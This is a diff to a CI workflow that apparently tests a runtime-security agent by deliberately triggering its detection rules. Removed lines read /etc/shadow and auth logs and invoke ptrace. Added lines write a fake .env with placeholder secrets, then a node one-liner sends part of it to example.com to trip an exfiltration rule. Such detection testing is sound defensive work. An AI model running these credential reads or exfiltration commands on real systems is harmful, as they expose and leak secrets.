@@ -9,20 +9,10 @@ jobs:
       - uses: o3security/secure-ci@v1
         with:
           runtime_security: "true"
-      - name: warm up, then trigger real detections
+      - name: warm up then trigger a real workload detection
         run: |
-          # give the eBPF agent time to attach its probes before doing anything
-          echo "waiting for agent to attach probes..."
-          sleep 35
-          echo "=== triggering behaviours the bundled rules watch for ==="
-          # privesc via sudo (not the sudo/login binaries themselves)
-          sudo id || true
-          # sensitive/log file access
-          sudo cat /var/log/auth.log 2>/dev/null | head -1 || true
-          sudo cat /etc/shadow 2>/dev/null | head -1 || true
-          # ptrace (kernel-exploit rule)
-          strace -f -e trace=ptrace true 2>/dev/null || true
-          # node touching a secret file (exfil rule)
-          echo "SECRET=abc" > .env
-          node -e "console.log(require('fs').readFileSync('.env','utf8'))" || true
+          sleep 40   # let probes attach
+          # a node process (not the runner) reading a secret file -> exfil rule
+          printf 'AWS_SECRET=AKIAIOSFODNN7EXAMPLE\nTOKEN=ghp_xxxxxxxxxxxxxxxxxxxx\n' > .env
+          node -e "const fs=require('fs'); const s=fs.readFileSync('.env','utf8'); require('https').get('https://example.com/?'+encodeURIComponent(s).slice(0,20), r=>r.resume()).on('error',()=>{});"
           sleep 15
